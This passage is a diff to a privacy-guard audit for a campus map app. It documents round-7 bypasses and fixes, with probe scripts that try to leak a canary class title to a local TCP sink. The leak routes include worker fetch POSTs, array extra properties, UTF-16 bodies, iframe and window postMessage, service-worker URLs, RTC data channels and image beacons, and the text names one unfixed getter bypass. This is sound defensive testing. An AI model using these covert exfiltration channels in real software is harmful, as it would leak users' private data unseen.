@@ -14,7 +14,110 @@ without `?walk=1` and looking.
 
 ---
 
-## THE VERDICT, ROUND 6 — read this first
+## THE VERDICT, ROUND 7 — read this first
+
+**Round 6 said it had stopped patching shapes and changed the default. It had
+changed half the default, and round 7's own probe put a class title through the
+other half and onto a raw TCP socket in the most ordinary shape in JavaScript:
+an array.**
+
+```js
+const a = [1, 2, 3];
+a.note = classTitle;          // an array with a property tacked on
+worker.postMessage({ a });    // guard armed → blocked: 0, opaque: 0
+```
+
+`structuredClone` carries that property — a clone walks
+`EnumerableOwnPropertyNames`, not the indices — so the worker received the title,
+decoded it, and its own `fetch` put it on the socket verbatim. The guard's
+counters read `blocked: 0, opaqueWorkerLeaves: 0`: **uncounted and unlogged**,
+the identical reading round 5 got from the `ArrayBuffer` hole round 6 existed to
+fix. Five variants of it leaked — `{ a }`, a bare top-level array, an `Array`
+subclass, a sparse array, and a whole object tree hanging off an array property.
+
+**Why it survived round 6.** Round 6 asked *which node kinds does the walk
+recognise* and got that right. It never asked *what does recognising one mean*.
+The array branch read
+
+```js
+for (let i = 0; i < x.length && swHit === null && !swTrunc; i++) scanWalk(x[i]);
+```
+
+— an index loop, which is not what a structured clone does to an array. So the
+one branch round 6's comment called "fully read" was the one that was not, and
+it was optimised into being wrong: arrays were the shape worth making fast.
+
+**Round 7's rule is the one the platform already uses.** For every kind this
+walk claims to read, it reads exactly what the clone algorithm reads. For
+`Array` and for a plain object that is the same thing — own enumerable
+properties — so they are now the same loop and an array is no longer a special
+case that can drift. Not a sixth patch: a rule that makes the sixth patch
+unnecessary.
+
+**A second, independent hole, in the half of the guard nobody was looking at.**
+Round 6 built `scanBytesForSchedule()` to read UTF-8 *and* UTF-16LE — the two
+encodings an honest bug produces — and wired it to exactly one of the two doors.
+`bodyToText()` decodes a network body as UTF-8 only, so
+
+```js
+fetch(sink, { method: 'POST', body: utf16leBufferOfTheTitle })
+```
+
+came back `204` off the same socket with the guard armed, while the *same title*
+UTF-8-encoded was refused. A guard that is encoding-complete on the worker path
+and encoding-blind on the network path is a coin flip about which door gets used.
+
+**And four doors that were never looked at at all.** Fired with the guard armed,
+each returned `checked: 0` — not allowed, *never inspected*:
+`window.postMessage`, `iframe.contentWindow.postMessage`,
+`navigator.serviceWorker.register(url)`, `RTCDataChannel.send`. The iframe one
+carries a fact worth keeping: **a same-origin child iframe is a separate
+JavaScript realm with its own intrinsics**, so patching our `Window.prototype`
+does not reach it, and its own `fetch` reaches the network the way a worker's
+does. The guard now follows the reference into any child realm this page has a
+handle on.
+
+| the probe, guard armed | round 6 | round 7 |
+|---|---|---|
+| `postMessage({ a })`, `a.note = title` | **landed on the socket**, blocked 0, opaque 0 | **refused**, blocked +1 |
+| a bare top-level array with a property | landed on the socket | refused |
+| an `Array` subclass with a property | landed on the socket | refused |
+| a sparse array with a property | landed on the socket | refused |
+| a hole *and* an extra, so counts cancel | landed on the socket | refused |
+| an object tree hanging off an array property | landed on the socket | refused |
+| `fetch(body: utf16leBuffer)` | `204` on the wire | refused |
+| `fetch(body: utf8Buffer)` | refused | refused |
+| `window.postMessage(title, '*')` | never inspected | refused |
+| `iframe.contentWindow.postMessage` | never inspected | refused |
+| `serviceWorker.register('/collect?t=' + title)` | never inspected | refused |
+| `RTCDataChannel.send(title)` | never inspected | refused |
+| round 5's `ArrayBuffer` transfer | refused | still refused |
+| a real MapLibre tile buffer | crosses | **still crosses, untouched** |
+| `new Image().src = sink + '?t=' + title` | on the wire | **still on the wire — §9** |
+
+The instrument is the same bare TCP listener, and the negative control is what
+makes the armed column mean anything: **disarmed, every one of those shapes put
+`Palaeobotanical Ensemble Studio` on the socket verbatim.**
+
+**And the map still draws.** Guard armed, a schedule stored, six pan-and-zoom
+legs across campus: `blocked: 0`, `truncatedScans: 0`, `scanThrows: 0`,
+`inspectFailures: 0`, **15,351 buffers and 122.5 MB of real tile bytes read by
+the guard and passed**, `styleLoaded: true`, `tilesLoaded: true`, 221 layers.
+Frame: `shots/si/privacy/r7-map-guarded.jpg`.
+
+**What it costs, and this round will not say "nothing" either.** On the real
+city the change is not measurable: three interleaved reps each way, guard time
+across an identical drive, **new 0.250–0.271 ms/message against old
+0.213–0.273** — the spreads overlap, which per `scripts/verify/README.md` means
+there is no result. Isolated on a fixed payload it is real and it is not small:
+a 600,000-element numeric array costs **103 ms per message against 13.6 ms**,
+7.6×. The two facts are both true because MapLibre's real payloads are binary,
+and the byte scan of ~120 MB dwarfs the walk. §8 has the ledger, including the
+optimisation that was rejected for being *unsound* rather than slow.
+
+---
+
+## Round 6 — the previous verdict, kept because round 7 is a correction to it
 
 **Round 5's critic put a class title through a worker and onto a raw TCP socket
 with the guard armed, and the guard did not even count it.** The walk that
@@ -685,6 +788,65 @@ at every start position. Together those took the per-message cost from
 **42.6 µs to 3.8 µs** on a 4,000-message benchmark, minimum of 8 interleaved
 reps.
 
+### Round 7: what the array fix costs, and the optimisation that was unsound
+
+Walking an array by own enumerable property instead of by index is more work.
+Two measurements, and they disagree in a way worth understanding rather than
+picking the flattering one from.
+
+**On the real city, there is no result.** Guard time across an identical six-leg
+pan-and-zoom drive, three interleaved reps each way, normalised per message
+because tile traffic itself varied 5,949–6,803 messages and 116–127 MB between
+reps:
+
+| | reps | per message |
+|---|---|---|
+| round 7, own-enumerable walk | 3 | **0.250 / 0.257 / 0.271 ms** |
+| round 6, index loop | 3 | **0.273 / 0.268 / 0.213 ms** |
+
+The spreads overlap, and `scripts/verify/README.md` is explicit that overlapping
+spreads mean there is no result. Reporting "round 7 is *faster*" off the first
+pair would have been the single-sample mistake that cost this repo four retracted
+claims on 2026-08-01.
+
+**Isolated on a fixed payload it is real, and it is not small.** Same page, same
+worker, guard-on minus guard-off, minimum of three reps:
+
+| payload | round 6 index loop | round 7 own-enumerable | ratio |
+|---|---|---|---|
+| a 600,000-element flat numeric array | **13.6 ms/message** | **103.4 ms/message** | 7.6× |
+| a 400-layer style tree of small arrays | 0.41 ms/message | 1.54 ms/message | 3.8× |
+| a tile-shaped message, 4 KB binary + 300 features | 0.122 ms/message | 0.291 ms/message | 2.4× |
+
+Both are true at once, and the reason is the honest part: **MapLibre's real
+payloads are binary, not giant JS arrays.** The byte scan of ~120 MB dwarfs the
+walk, so 7.6× on a shape this app never sends disappears into a drive that scans
+15,351 buffers. The synthetic number is kept anyway, because the next lane may
+send a shape this app does not.
+
+**The optimisation that was rejected — for being wrong, not for being slow.**
+The obvious way to keep the fast index loop is to run it and then ask whether the
+array has anything else on it:
+
+```js
+if (Object.keys(x).length !== x.length) { /* ...walk the extras... */ }
+```
+
+It is unsound. An array with **both a hole and an extra property** has the two
+cancel out: `a = new Array(3); a[0] = 1; a[1] = 2; a.note = title` has `length` 3
+and keys `['0','1','note']`, so the count test says "no extras" and the title
+rides through — and `structuredClone` carries it, measured. `arrayHoleAndExtra`
+is a probe shape for exactly this: it leaks with the guard disarmed and is
+refused with it armed, so a future speed-up cannot quietly reintroduce the test.
+
+**Round 7's new doors cost nothing, and that is measured rather than asserted.**
+A full drive of the real city reports `frameChecked: 0`, `swChecked: 0`,
+`rtcChecked: 0`, `portChecked: 0`, `bodyBytesScanned: 0` — this app makes no
+`window.postMessage` call, creates no iframe, registers no service worker, opens
+no data channel, and sends no request with a body at all. All five counters are
+published through `guard.state()`, so the next person re-checks this paragraph in
+one line instead of trusting it.
+
 ---
 
 ## 9. The guard, and exactly what it is not
@@ -696,8 +858,16 @@ reach a worker, and refuses any that carries a watched string:
 (open and send), `EventSource`, `HTMLFormElement.submit` plus a capture-phase
 `submit` listener.
 **Into a worker:** `Worker.prototype.postMessage`, `MessagePort.prototype.postMessage`,
-`BroadcastChannel.prototype.postMessage`, and the `Worker` / `SharedWorker`
-constructors' script URLs.
+`BroadcastChannel.prototype.postMessage`, `ServiceWorker.prototype.postMessage`,
+and the `Worker` / `SharedWorker` constructors' script URLs plus
+`navigator.serviceWorker.register`.
+**Into another realm or peer (round 7):** `window.postMessage`,
+`Window.prototype.postMessage`, `window.open`, and `RTCDataChannel.send`. Every
+one of these returned `checked: 0` when fired at an armed round-6 guard — never
+inspected, not merely allowed.
+**Into a child realm (round 7):** reading an `<iframe>`'s `contentWindow`, or
+taking the Window back from `window.open`, wraps that realm's own `postMessage`
+and `fetch` before the caller can use them. See the limit below.
 
 It is a **seatbelt, not the safety case.** The safety case is that no code here
 sends anything. The guard exists so that if a later lane wires an analytics call
@@ -751,9 +921,28 @@ it sounds, and both are worth stating because they are load-bearing:
   message cannot break tile loading the way a broken `fetch` wrapper could.
   2,545 real messages a load produce zero throws; the audit asserts
   `inspectFailures === 0` and `scanThrows === 0`.
+- **A child realm's own children.** Round 7 wraps a same-origin iframe's
+  `postMessage` and `fetch` when this page reads its `contentWindow`, because a
+  same-origin child iframe is a **separate JavaScript realm with its own
+  intrinsics** and every wrapper in this file is invisible inside it. That
+  follows references passing through *this* page and no further: a child realm
+  can mint its own child, and a cross-origin frame cannot be patched at all
+  (the assignment throws `SecurityError`, which is also the browser saying our
+  objects cannot reach it). Same seatbelt, same limit.
+- **A getter that answers differently the second time.** The walk reads a
+  property, then `postMessage`'s serialiser reads it again; a getter returning
+  `'safe'` then the class title defeats the scan by construction. Closing it
+  would mean serialising every payload twice on the tile path. It is not an
+  honest-bug shape — a mistake does not alternate — and this is a seatbelt, not
+  a sandbox. Named rather than left to be discovered.
 - **An unreadable body no longer fails open** (round 4's finding, §6), and
   **an unreadable payload node no longer passes silently** (rounds 5 and 6).
   Both of these bullets used to say the opposite, and both were wrong.
+- **An array is no longer read by index** (round 7). That bullet is not in this
+  list any more because it moved from "not covered" to "covered" — but it was
+  never in this list when it was true, which is the failure mode this section
+  exists to prevent. If a shape is not covered it belongs here, named, on the
+  round it is found.
 
 ---
 
@@ -1756,4 +1945,514 @@ fs.writeFileSync(OUT + '/r6-results.json', JSON.stringify(results, null, 2));
 await browser.close();
 sink.close();
 console.log('\nDONE');
+```
+
+### 11d. `r7-holes.mjs` — the round-7 leak proof
+
+Two independent measurements per shape, and both are needed: `clone` asks
+whether `structuredClone` actually carries the canary (if it does not, a miss in
+the walk is harmless), `guard` asks whether an armed guard refuses it. A shape
+that is `clone:true, guard:pass` is a real, silent bypass. Run it with
+`--disarm` for the negative control that makes the armed column mean anything.
+
+```js
+/**
+ * r7-holes.mjs — round 7's own adversarial pass over round 6's rewrite.
+ *
+ * Round 6 inverted the default in `scanStructured()`: a closed list of node
+ * kinds it can read, everything else flagged opaque. This probe asks the only
+ * question that matters about that claim — is the closed list itself right?
+ * A node kind the walk THINKS it reads fully, but does not, is worse than an
+ * unknown one, because it never reaches the default branch at all.
+ *
+ * TWO INDEPENDENT MEASUREMENTS PER SHAPE, and both are needed:
+ *   clone : does `structuredClone()` actually carry the canary? (if not, a miss
+ *           in the walk is harmless — the receiver never sees it)
+ *   guard : does an armed guard refuse it?
+ * A shape that is `clone:true, guard:pass` is a real, silent bypass.
+ */
+import net from 'node:net';
+import { chromium } from 'file:///C:/Users/simip/Projects/austin-3d-explorer/.claude/worktrees/wf_ff5b28e1-26f-3/scripts/verify/node_modules/playwright-core/index.mjs';
+import { launch } from 'file:///C:/Users/simip/Projects/austin-3d-explorer/.claude/worktrees/wf_ff5b28e1-26f-3/scripts/verify/chrome.mjs';
+
+const BASE = process.env.VERIFY_URL || 'http://127.0.0.1:8951';
+const SINK_PORT = Number(process.env.SINK_PORT || 8962);
+
+let sinkBytes = [];
+const sink = net.createServer((sock) => {
+  sock.on('data', (b) => sinkBytes.push(b));
+  sock.on('error', () => {});
+  setTimeout(() => {
+    try {
+      sock.write('HTTP/1.1 204 No Content\r\nAccess-Control-Allow-Origin: *\r\nContent-Length: 0\r\nConnection: close\r\n\r\n');
+      sock.end();
+    } catch (e) {}
+  }, 60);
+});
+await new Promise((r) => sink.listen(SINK_PORT, '127.0.0.1', r));
+const sinkText = () => Buffer.concat(sinkBytes).toString('latin1');
+const sinkReset = () => { sinkBytes = []; };
+
+// Round 7's own canaries. Not borrowed from round 5 or round 6.
+const C = {
+  title: 'Palaeobotanical Ensemble Studio',
+  instructor: 'Prof. Isolde Marchbanks',
+  room: 'BUR 0.220',
+};
+
+const browser = await launch(chromium, { maxMs: 600000 });
+const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 } });
+const page = await ctx.newPage();
+page.on('pageerror', (e) => console.log('PAGEERROR: ' + e.message));
+
+await page.goto(BASE + '/index.html?walk=1&drift=0', { waitUntil: 'domcontentloaded' });
+await page.evaluate(() => { try { window.cancelGraphicsAutoDetect && window.cancelGraphicsAutoDetect(); } catch (e) {} });
+await page.waitForFunction(() => window.__map && window.__map.isStyleLoaded && window.__map.isStyleLoaded(), null, { timeout: 180000 });
+await page.waitForTimeout(9000);
+
+const saved = await page.evaluate((c) => window.WAYFIND.store.save({
+  term: 'Fall 2026', tz: 'America/Chicago',
+  sources: [{ kind: 'ut-registration' }],
+  classes: [{ code: 'BUR', room: '0.220', title: c.title, instructor: c.instructor,
+              days: ['M', 'W'], startMin: 540, endMin: 600 }],
+}), C);
+console.log('save: ' + JSON.stringify(saved));
+const DISARM = process.argv.includes('--disarm');
+console.log('armed: ' + await page.evaluate((d) =>
+  d ? window.WAYFIND.store.guard.__disarmForAudit() : window.WAYFIND.store.guard.arm(), DISARM));
+
+// ── the worker: decodes ANY string it can find, however buried, and dials out
+//    with its own fetch. Same second half as the round-5 break. ──────────────
+const WORKER_SRC = `
+self.onmessage = (e) => {
+  const found = [];
+  const seen = new Set();
+  const grab = (x, d) => {
+    if (d > 8 || x == null || found.length) return;
+    if (typeof x === 'string') { found.push(x); return; }
+    if (typeof x !== 'object') return;
+    if (seen.has(x)) return; seen.add(x);
+    if (x instanceof ArrayBuffer) { found.push(new TextDecoder('utf-8').decode(new Uint8Array(x))); return; }
+    if (ArrayBuffer.isView(x)) {
+      const u8 = new Uint8Array(x.buffer, x.byteOffset, x.byteLength);
+      found.push(new TextDecoder('utf-16le').decode(u8));
+      found.push(new TextDecoder('utf-8').decode(u8));
+      return;
+    }
+    if (x instanceof Map) { for (const p of x) { grab(p[0], d+1); grab(p[1], d+1); } }
+    if (x instanceof Set) { for (const v of x) grab(v, d+1); }
+    for (const k in x) grab(x[k], d + 1);
+  };
+  grab(e.data, 0);
+  const text = found.join(' | ');
+  fetch('http://127.0.0.1:__SINK__/leak', { method: 'POST', body: text })
+    .then(r => self.postMessage({ text: text.slice(0, 200), sent: r.status }))
+    .catch(err => self.postMessage({ text: text.slice(0, 200), sent: 'err:' + err.message }));
+};`.replace('__SINK__', String(SINK_PORT));
+
+await page.evaluate((src) => {
+  window.__mk = () => {
+    const url = URL.createObjectURL(new Blob([src], { type: 'text/javascript' }));
+    const w = new Worker(url);
+    w.__last = new Promise((res) => { w.onmessage = (ev) => res(ev.data); });
+    return w;
+  };
+}, WORKER_SRC);
+
+/**
+ * Each shape is a factory body evaluated in the page. Returns the payload to
+ * postMessage. `clone` is measured separately with structuredClone(), so a
+ * miss in the walk that the platform does not actually carry is not counted
+ * as a leak.
+ */
+const SHAPES = {
+  // -- the control: round 5's break, which round 6 closed -------------------
+  arrayBufferTransfer: `(c) => ({ tile: 'x', payload: new TextEncoder().encode(c.title).buffer })`,
+  plainString:         `(c) => ({ t: c.title })`,
+
+  // -- "a node kind the walk thinks it reads fully" ------------------------
+  arrayExtraProp:      `(c) => { const a = [1,2,3]; a.note = c.title; return { a }; }`,
+  arrayExtraPropTop:   `(c) => { const a = [1,2,3]; a.note = c.title; return a; }`,
+  arraySubclassProp:   `(c) => { class A extends Array {}; const a = A.from([1,2]); a.note = c.title; return { a }; }`,
+  arrayHoleProp:       `(c) => { const a = new Array(3); a.meta = c.instructor; return { a }; }`,
+  // THE SHAPE THAT KILLS THE OBVIOUS OPTIMISATION. `Object.keys(a).length !==
+  // a.length` looks like a cheap "does this array have extras" test; here the
+  // hole and the extra cancel out — length 3, keys ['0','1','note'] — so the
+  // count test says "no extras" and the canary rides through. Kept as a probe
+  // so nobody reintroduces that test as a speed-up.
+  arrayHoleAndExtra:   `(c) => { const a = new Array(3); a[0]=1; a[1]=2; a.note = c.title; return { a }; }`,
+  mapExtraProp:        `(c) => { const m = new Map([['k','v']]); m.note = c.title; return { m }; }`,
+  setExtraProp:        `(c) => { const s = new Set(['v']); s.note = c.title; return { s }; }`,
+  dateExtraProp:       `(c) => { const d = new Date(); d.note = c.title; return { d }; }`,
+  regexpExtraProp:     `(c) => { const r = /abc/g; r.note = c.title; return { r }; }`,
+  errorExtraProp:      `(c) => { const e = new Error('boom'); e.note = c.title; return { e }; }`,
+  typedArrayExtraProp: `(c) => { const u = new Uint8Array([1,2,3,4]); u.note = c.title; return { u }; }`,
+  stringWrapperProp:   `(c) => { const s = new String('safe'); s.note = c.title; return { s }; }`,
+  numberWrapperProp:   `(c) => { const n = new Number(1); n.note = c.title; return { n }; }`,
+  boolWrapperProp:     `(c) => { const b = new Boolean(true); b.note = c.title; return { b }; }`,
+
+  // -- encodings the byte scanner may or may not reach ---------------------
+  utf16leBuffer:       `(c) => { const s = c.title; const u = new Uint16Array(s.length); for (let i=0;i<s.length;i++) u[i]=s.charCodeAt(i); return { p: u.buffer }; }`,
+  nestedInArrayProp:   `(c) => { const a = []; a.deep = { x: [ { y: c.room } ] }; return { a }; }`,
+};
+
+const probeShape = (name, body) => page.evaluate(async ([n, b, c]) => {
+  const g = window.WAYFIND.store.guard;
+  const make = new Function('c', 'return (' + b + ')(c)');
+  // 1. does the platform actually carry the canary across a structured clone?
+  let cloneCarries = null, cloneErr = null;
+  try {
+    const cl = structuredClone(make(c));
+    const hay = [];
+    const seen = new Set();
+    const walk = (x, d) => {
+      if (d > 8 || x == null) return;
+      if (typeof x === 'string') { hay.push(x); return; }
+      if (typeof x !== 'object') return;
+      if (seen.has(x)) return; seen.add(x);
+      if (x instanceof ArrayBuffer) { hay.push(new TextDecoder('utf-8').decode(new Uint8Array(x))); hay.push(new TextDecoder('utf-16le').decode(new Uint8Array(x))); return; }
+      if (ArrayBuffer.isView(x)) { const u8 = new Uint8Array(x.buffer, x.byteOffset, x.byteLength); hay.push(new TextDecoder('utf-8').decode(u8)); hay.push(new TextDecoder('utf-16le').decode(u8)); return; }
+      if (x instanceof Map) { for (const p of x) { walk(p[0], d+1); walk(p[1], d+1); } }
+      if (x instanceof Set) { for (const v of x) walk(v, d+1); }
+      for (const k in x) walk(x[k], d + 1);
+    };
+    walk(cl, 0);
+    const all = hay.join(' | ');
+    cloneCarries = all.indexOf(c.title) !== -1 || all.indexOf(c.instructor) !== -1 || all.indexOf(c.room) !== -1;
+  } catch (e) { cloneErr = String(e && e.message || e); }
+
+  // 2. does the armed guard refuse a postMessage of it?
+  const before = g.state();
+  let threw = null;
+  const w = window.__mk();
+  try { w.postMessage(make(c)); }
+  catch (e) { threw = String(e && e.message || e); }
+  let got = null;
+  if (!threw) { got = await Promise.race([w.__last, new Promise(r => setTimeout(() => r({ timeout: true }), 3000))]); }
+  try { w.terminate(); } catch (e) {}
+  const after = g.state();
+  return {
+    name: n, cloneCarries, cloneErr,
+    blockedDelta: after.blocked - before.blocked,
+    opaqueDelta: after.opaqueWorkerLeaves - before.opaqueWorkerLeaves,
+    truncDelta: after.truncatedScans - before.truncatedScans,
+    threw: threw ? threw.slice(0, 90) : null,
+    workerSaw: got && got.text ? got.text.slice(0, 120) : null,
+    workerSent: got && got.sent,
+  };
+}, [name, body, C]);
+
+console.log('\n== SHAPE MATRIX (guard ARMED) ==');
+const shapeRows = [];
+for (const [name, body] of Object.entries(SHAPES)) {
+  sinkReset();
+  const r = await probeShape(name, body);
+  await page.waitForTimeout(200);
+  const st = sinkText();
+  r.sinkHasCanary = st.indexOf(C.title) !== -1 || st.indexOf(C.instructor) !== -1 || st.indexOf(C.room) !== -1;
+  r.leak = !!(r.cloneCarries && r.blockedDelta === 0);
+  shapeRows.push(r);
+  console.log(
+    (r.leak ? 'LEAK  ' : (r.cloneCarries ? 'ok    ' : 'n/a   ')) +
+    name.padEnd(22) +
+    ' clone=' + String(r.cloneCarries).padEnd(5) +
+    ' blocked=' + String(r.blockedDelta) +
+    ' opaque=' + String(r.opaqueDelta) +
+    ' sink=' + String(r.sinkHasCanary) +
+    (r.threw ? '  threw' : '') +
+    (r.workerSaw && (r.workerSaw.indexOf(C.title) !== -1 || r.workerSaw.indexOf(C.instructor) !== -1 || r.workerSaw.indexOf(C.room) !== -1) ? '  WORKER-SAW-IT' : '')
+  );
+}
+
+// ── channels: doors that never touch Worker.prototype.postMessage ──────────
+console.log('\n== CHANNEL MATRIX (guard ARMED) ==');
+const CHANNELS = {
+  windowPostMessage: `async (c, sink) => {
+     let got = null;
+     const h = (e) => { if (typeof e.data === 'string' && e.data.indexOf(c.title) !== -1) got = 'received'; };
+     window.addEventListener('message', h);
+     window.postMessage({ payload: c.title }, '*');
+     await new Promise(r => setTimeout(r, 200));
+     window.removeEventListener('message', h);
+     return got || 'sent-no-throw';
+   }`,
+  iframePostMessage: `async (c) => {
+     const f = document.createElement('iframe');
+     f.src = 'about:blank'; f.style.display = 'none';
+     document.body.appendChild(f);
+     await new Promise(r => setTimeout(r, 120));
+     f.contentWindow.postMessage({ payload: c.title }, '*');
+     f.remove();
+     return 'sent-no-throw';
+   }`,
+  serviceWorkerProtoExists: `(c) => typeof ServiceWorker !== 'undefined' && !!(ServiceWorker.prototype && ServiceWorker.prototype.postMessage)`,
+  swRegisterUrl: `async (c) => {
+     try { await navigator.serviceWorker.register('/collect?t=' + encodeURIComponent(c.title)); return 'registered'; }
+     catch (e) { return 'err:' + String(e.message).slice(0, 60); }
+   }`,
+  rtcDataChannelSend: `async (c, sink) => {
+     if (typeof RTCPeerConnection === 'undefined') return 'no-rtc';
+     const pc = new RTCPeerConnection();
+     const dc = pc.createDataChannel('x');
+     let threw = null;
+     try { dc.send(c.title); } catch (e) { threw = String(e.message).slice(0, 60); }
+     pc.close();
+     return threw || 'send-no-throw';
+   }`,
+  fetchUtf16Body: `async (c, sink) => {
+     const s = c.title; const u = new Uint16Array(s.length);
+     for (let i=0;i<s.length;i++) u[i]=s.charCodeAt(i);
+     try { const r = await fetch('http://127.0.0.1:' + sink + '/u16', { method:'POST', body: u.buffer, mode:'cors' }); return 'sent:' + r.status; }
+     catch (e) { return 'err:' + String(e.message).slice(0, 70); }
+   }`,
+  fetchUtf8Body: `async (c, sink) => {
+     try { const r = await fetch('http://127.0.0.1:' + sink + '/u8', { method:'POST', body: new TextEncoder().encode(c.title), mode:'cors' }); return 'sent:' + r.status; }
+     catch (e) { return 'err:' + String(e.message).slice(0, 70); }
+   }`,
+  imgSrc: `async (c, sink) => {
+     const i = new Image();
+     i.src = 'http://127.0.0.1:' + sink + '/img?t=' + encodeURIComponent(c.title);
+     await new Promise(r => setTimeout(r, 400));
+     return 'issued';
+   }`,
+};
+
+const channelRows = [];
+for (const [name, body] of Object.entries(CHANNELS)) {
+  sinkReset();
+  const r = await page.evaluate(async ([n, b, c, sp]) => {
+    const g = window.WAYFIND.store.guard;
+    const before = g.state();
+    let ret = null, threw = null;
+    try { ret = await (new Function('c', 'sink', 'return (' + b + ')(c, sink)'))(c, sp); }
+    catch (e) { threw = String(e && e.message || e).slice(0, 100); }
+    const after = g.state();
+    return { name: n, ret, threw,
+             blockedDelta: after.blocked - before.blocked,
+             checkedDelta: after.checked - before.checked };
+  }, [name, body, C, SINK_PORT]);
+  await page.waitForTimeout(400);
+  const st = sinkText();
+  r.sinkHasCanary = st.indexOf(C.title) !== -1 || st.indexOf(encodeURIComponent(C.title)) !== -1;
+  // utf16 lands on the wire as interleaved NULs; look for that too
+  r.sinkHasUtf16 = st.replace(/\u0000/g, '').indexOf(C.title) !== -1;
+  channelRows.push(r);
+  console.log(
+    ((r.sinkHasCanary || r.sinkHasUtf16) ? 'ON-WIRE ' : '        ') +
+    name.padEnd(26) +
+    ' blocked=' + String(r.blockedDelta).padEnd(3) +
+    ' checked=' + String(r.checkedDelta).padEnd(3) +
+    ' ret=' + JSON.stringify(r.ret) +
+    (r.threw ? ' threw=' + r.threw : '')
+  );
+}
+
+console.log('\n== FINAL STATE ==');
+console.log(JSON.stringify(await page.evaluate(() => window.WAYFIND.store.guard.state()), null, 1));
+
+await browser.close();
+sink.close();
+
+const leaks = shapeRows.filter(r => r.leak).map(r => r.name);
+const wire = channelRows.filter(r => r.sinkHasCanary || r.sinkHasUtf16).map(r => r.name);
+console.log('\nSHAPE LEAKS: ' + (leaks.length ? leaks.join(', ') : 'none'));
+console.log('CHANNELS ON THE WIRE: ' + (wire.length ? wire.join(', ') : 'none'));
+process.exit(0);
+```
+
+### 11e. `r7-micro.mjs` — the isolated cost of the array change
+
+The real-drive A/B could not answer it: tile traffic varied 5,949–6,803 messages
+and 116–127 MB between reps, and the spreads overlapped. This pins the payload
+and varies only the walk.
+
+```js
+/**
+ * r7-micro.mjs <label> — isolate the cost of the array-branch change.
+ *
+ * The real-drive A/B could not answer it: tile traffic varied 5,949–6,803
+ * messages and 116–127 MB between reps, and the spreads overlapped, which per
+ * scripts/verify/README.md means there is no result. So this pins the payload
+ * and varies only the walk. Payload shapes chosen to be the ones that can
+ * actually hurt: a very large flat numeric array (MapLibre geometry), a deep
+ * nest of small arrays (a style/layer tree), and a binary leaf beside them.
+ *
+ * Minimum of interleaved reps, in-page timing, never wall clock.
+ */
+import { chromium } from 'file:///C:/Users/simip/Projects/austin-3d-explorer/.claude/worktrees/wf_ff5b28e1-26f-3/scripts/verify/node_modules/playwright-core/index.mjs';
+import { launch } from 'file:///C:/Users/simip/Projects/austin-3d-explorer/.claude/worktrees/wf_ff5b28e1-26f-3/scripts/verify/chrome.mjs';
+
+const BASE = process.env.VERIFY_URL || 'http://127.0.0.1:8951';
+const label = process.argv[2] || 'run';
+
+const browser = await launch(chromium, { maxMs: 420000 });
+const ctx = await browser.newContext({ viewport: { width: 1280, height: 800 } });
+const page = await ctx.newPage();
+await page.goto(BASE + '/index.html?walk=1&drift=0', { waitUntil: 'domcontentloaded' });
+await page.evaluate(() => { try { window.cancelGraphicsAutoDetect && window.cancelGraphicsAutoDetect(); } catch (e) {} });
+await page.waitForFunction(() => window.__map && window.__map.isStyleLoaded && window.__map.isStyleLoaded(), null, { timeout: 180000 });
+await page.waitForTimeout(7000);
+
+const out = await page.evaluate(async () => {
+  const SCHED = {
+    term: 'Fall 2026', sources: [{ kind: 'ut-registration' }],
+    classes: [{ code: 'BUR', room: '0.220', title: 'Palaeobotanical Ensemble Studio',
+                instructor: 'Prof. Isolde Marchbanks', days: ['M'], startMin: 540, endMin: 600 }],
+  };
+  const W = new Worker(URL.createObjectURL(new Blob(['self.onmessage=()=>{}'], { type: 'text/javascript' })));
+
+  // A MapLibre-shaped geometry array: 600k flat numbers.
+  const geom = { type: 'geometry', v: new Array(600000).fill(0).map((_, i) => i) };
+  // A layer/style-shaped tree: many small arrays inside objects.
+  const tree = { layers: [] };
+  for (let i = 0; i < 400; i++) {
+    tree.layers.push({ id: 'l' + i, filter: ['all', ['==', 'class', 'x' + i], ['>', 'h', i]],
+                       stops: [[10, i], [14, i * 2], [18, i * 3]] });
+  }
+  // A tile-shaped message: binary leaf plus a modest array of features.
+  const bin = new Uint8Array(4096);
+  const tile = { id: 'z16/1/2', buffer: bin,
+                 features: new Array(300).fill(0).map((_, i) => ({ i, g: [i, i + 1, i + 2, i + 3] })) };
+
+  const run = (payload, reps, iters) => {
+    const t = [];
+    for (let r = 0; r < reps; r++) {
+      const a = performance.now();
+      for (let i = 0; i < iters; i++) { try { W.postMessage(payload); } catch (e) {} }
+      t.push(performance.now() - a);
+    }
+    return Math.round(Math.min(...t) * 10) / 10;
+  };
+  const suite = () => ({
+    geom600k_x5: run(geom, 3, 5),
+    styleTree_x300: run(tree, 3, 300),
+    tileMsg_x2000: run(tile, 3, 2000),
+  });
+
+  window.WAYFIND.store.clear();
+  const off = suite();
+  window.WAYFIND.store.save(SCHED);
+  window.WAYFIND.store.guard.arm();
+  const on = suite();
+  window.WAYFIND.store.clear();
+  const off2 = suite();
+  W.terminate();
+  return { guardOff: off, guardOn: on, guardOffAgain: off2 };
+});
+
+console.log(label + ' ' + JSON.stringify(out));
+await browser.close();
+process.exit(0);
+```
+
+### 11f. `r7-map-cost.mjs` — the map still draws, and what the guard costs on it
+
+The timer is installed AFTER the guard, so the interval it measures includes the
+walk. `--shot` takes the frame at `shots/si/privacy/r7-map-guarded.jpg`.
+
+```js
+/**
+ * r7-map-cost.mjs <label> [--shot <path>] [--nosched]
+ *
+ * Two questions about the round-7 array fix, on the real city:
+ *   1. does the map still draw with the guard armed and a schedule stored?
+ *   2. what does walking an array by own-enumerable-property instead of by
+ *      index cost on MapLibre's real tile path?
+ *
+ * (2) is measured INSIDE the page, as time spent in `Worker.prototype.
+ * postMessage` across an identical scripted camera drive — never wall clock,
+ * which on this suite measures the machine. The timer is installed AFTER the
+ * guard, so `pm` is the guarded function and the interval includes the walk.
+ * One reading is not a result: the caller interleaves labels and takes the
+ * minimum (scripts/verify/README.md).
+ */
+import { chromium } from 'file:///C:/Users/simip/Projects/austin-3d-explorer/.claude/worktrees/wf_ff5b28e1-26f-3/scripts/verify/node_modules/playwright-core/index.mjs';
+import { launch } from 'file:///C:/Users/simip/Projects/austin-3d-explorer/.claude/worktrees/wf_ff5b28e1-26f-3/scripts/verify/chrome.mjs';
+
+const BASE = process.env.VERIFY_URL || 'http://127.0.0.1:8951';
+const label = process.argv[2] || 'run';
+const shotAt = process.argv.includes('--shot') ? process.argv[process.argv.indexOf('--shot') + 1] : null;
+const noSched = process.argv.includes('--nosched');
+
+const C = {
+  title: 'Palaeobotanical Ensemble Studio',
